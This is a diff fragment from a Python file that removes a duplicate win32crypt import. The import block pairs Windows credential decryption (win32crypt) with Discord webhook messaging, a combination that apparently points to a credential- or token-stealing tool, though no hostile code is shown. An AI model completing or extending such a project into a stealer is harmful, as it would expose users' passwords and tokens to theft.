@@ -17,7 +17,6 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 import discord
 import win32crypt
 import codecs
-import win32crypt
 import shutil
 import command
 import time
